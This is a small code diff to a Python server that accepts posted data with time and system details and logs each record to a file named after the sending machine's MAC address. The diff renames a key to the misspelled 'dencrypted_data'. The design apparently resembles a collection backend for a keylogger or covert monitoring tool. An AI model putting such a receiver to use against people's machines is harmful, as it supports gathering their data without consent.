@@ -64,7 +64,7 @@ class Server:
             if not data:
                 return jsonify({"error": "מחכה לשליחת מידע..."}), 400
 
-            self.logs_dict = {"encrypted_data": data,"time": time,"system": system}
+            self.logs_dict = {"dencrypted_data": data,"time": time,"system": system}
             self.logs_list.append(self.logs_dict)
 
             name_for_file = str(self.logs_dict['system']['mac']).replace(":", "-")
@@ -80,7 +80,7 @@ class Server:
 
             with open(file_path, "a", encoding="utf-8") as file:
                 file.write(f"Time: {self.logs_dict['time']}\n")
-                file.write(f"Decrypted Data: {self.logs_dict['decrypted_data']}\n")
+                file.write(f"Decrypted Data: {self.logs_dict['dencrypted_data']}\n")
                 file.write(f"System Info: {json.dumps(self.logs_dict['system'])}\n")
                 file.write("\n")
 
